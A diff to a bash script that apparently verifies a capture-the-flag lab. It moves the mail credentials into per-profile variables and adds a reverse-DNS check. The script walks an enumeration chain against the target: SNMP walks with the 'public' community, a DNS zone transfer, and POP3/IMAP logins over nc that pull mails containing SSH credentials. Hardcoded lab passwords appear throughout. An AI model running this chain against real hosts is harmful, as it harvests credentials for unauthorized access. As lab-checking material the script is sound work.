@@ -15,11 +15,15 @@ if [[ "$profile" == week5_demo ]]; then
   file_name=internal-notes.txt
   ssh_username=demo_operator
   ssh_password='DemoSsh-Only-2026!'
+  mail_username=demo_analyst
+  mail_password='DemoMail-Only-2026!'
 else
   host_only_ip=192.168.56.50
   file_name=flag.txt
   ssh_username=operator
   ssh_password='LlYcvWqWdJKvvnNmlruUY/bb'
+  mail_username=analyst
+  mail_password='MailLab-Only-2026'
 fi
 target="${1:-$host_only_ip}"
 dns_expected_ip="${3:-$target}"
@@ -100,21 +104,21 @@ record_flag RSYNC "$(<"$tmp_dir/rsync-note.txt")"
 
 record_flag SNMP "$(snmpget -v2c -c public "$target" 1.3.6.1.2.1.1.6.0)"
 snmp_system_info="$(snmpwalk -v2c -c public "$target")"
-grep -q '/opt/wri-mail-lab.py --username analyst --password MailLab-Only-2026' <<<"$snmp_system_info"
+grep -Fq "/opt/wri-mail-lab.py --username $mail_username --password $mail_password" <<<"$snmp_system_info"
 printf '[OK] Default SNMP walk exposes the valid IMAP/POP3 lab credential.\n'
 dns_axfr="$(dig "@${target}" wri.local AXFR)"
 grep -q 'intranet\.wri\.local\.' <<<"$dns_axfr"
 record_flag 'DNS AXFR' "$(grep 'replica-catalog\.wri\.local\.' <<<"$dns_axfr")"
 
-pop3_result="$(printf 'USER analyst\r\nPASS MailLab-Only-2026\r\nRETR 2\r\nQUIT\r\n' | nc -w 8 "$target" 110 || true)"
+pop3_result="$(printf 'USER %s\r\nPASS %s\r\nRETR 2\r\nQUIT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 110 || true)"
 record_flag POP3 "$pop3_result"
-pop3_ssh_mail="$(printf 'USER analyst\r\nPASS MailLab-Only-2026\r\nRETR 3\r\nQUIT\r\n' | nc -w 8 "$target" 110 || true)"
+pop3_ssh_mail="$(printf 'USER %s\r\nPASS %s\r\nRETR 3\r\nQUIT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 110 || true)"
 grep -Fq "SSH username: $ssh_username" <<<"$pop3_ssh_mail"
 grep -Fq "SSH password: $ssh_password" <<<"$pop3_ssh_mail"
 
-imap_result="$(printf 'a1 LOGIN analyst MailLab-Only-2026\r\na2 SELECT INBOX\r\na3 FETCH 2 BODY[]\r\na4 LOGOUT\r\n' | nc -w 8 "$target" 143 || true)"
+imap_result="$(printf 'a1 LOGIN %s %s\r\na2 SELECT INBOX\r\na3 FETCH 2 BODY[]\r\na4 LOGOUT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 143 || true)"
 record_flag IMAP "$imap_result"
-imap_ssh_mail="$(printf 'a1 LOGIN analyst MailLab-Only-2026\r\na2 SELECT INBOX\r\na3 FETCH 3 BODY[]\r\na4 LOGOUT\r\n' | nc -w 8 "$target" 143 || true)"
+imap_ssh_mail="$(printf 'a1 LOGIN %s %s\r\na2 SELECT INBOX\r\na3 FETCH 3 BODY[]\r\na4 LOGOUT\r\n' "$mail_username" "$mail_password" | nc -w 8 "$target" 143 || true)"
 grep -Fq "SSH username: $ssh_username" <<<"$imap_ssh_mail"
 grep -Fq "SSH password: $ssh_password" <<<"$imap_ssh_mail"
 
@@ -126,6 +130,9 @@ record_flag NFS "$nfs_content"
 dig +short "@${target}" target.wri.local A | grep -qx "$dns_expected_ip"
 dig +short "@${target}" intranet.wri.local A | grep -qx "$dns_expected_ip"
 dig +short "@${target}" -x "$host_only_ip" | grep -qx 'target.wri.local.'
+if [[ "$dns_expected_ip" != "$host_only_ip" ]]; then
+  dig +short "@${target}" -x "$dns_expected_ip" | grep -qx 'target.wri.local.'
+fi
 showmount -e "$target" | grep -q '/srv/nfs/public'
 
 unique_count="$(printf '%s\n' "${flags[@]}" | sort -u | wc -l | tr -d ' ')"
